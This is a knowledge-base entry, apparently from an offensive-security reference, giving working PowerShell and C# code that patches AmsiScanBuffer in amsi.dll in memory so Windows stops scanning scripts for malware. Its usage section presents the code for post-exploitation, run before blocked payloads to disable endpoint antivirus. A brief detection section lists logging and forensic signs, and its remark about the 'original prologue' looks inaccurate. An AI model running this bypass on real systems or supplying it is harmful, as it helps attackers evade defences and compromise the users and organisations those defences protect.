---
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.125890+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - amsi-bypass
  - c-sharp
  - reflection
  - defense-evasion
validated: true
---

# C-Sharp-AMSI-Patch-Via-Reflection

## Code

```powershell
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Successful");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
```

## Description

This PowerShell here-string contains C# code that defines a reflective assembly to patch the AmsiScanBuffer function in amsi.dll. It uses P/Invoke to load the DLL, locate the function, change memory protection, and overwrite the function prologue with RET bytes (skipping the scan). The code auto-detects 32/64-bit architecture and outputs success or error messages. Designed for in-memory execution via Add-Type to evade AMSI and logging in WMF5 PowerShell sessions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| No user-defined variables | The code uses static byte arrays for patches and internal logic for architecture detection | N/A |

## Usage

Embed this here-string in a PowerShell script or session, then compile with Add-Type -TypeDefinition $Winpatch -Language CSharp followed by [patch]::it(). Use prior to executing blocked payloads like encoded commands or downloaded scripts. Ideal for post-exploitation in Windows environments to disable endpoint AV scanning.

## Detection

- PowerShell Event ID 4103/4104 logging Add-Type with C# compilation.
- Sysmon ImageLoad for amsi.dll followed by VirtualProtect calls (API monitor).
- Console output strings like "Patch Successful" in process stdout.
- Memory forensics for altered AmsiScanBuffer (original prologue: MOV EAX, 07000057h).

## Related

- [[procedures/Reflection-Based-AMSI-Bypass-with-WMF5-Autologging]]
- [[commands/powershell-patch-amsi-reflection]]
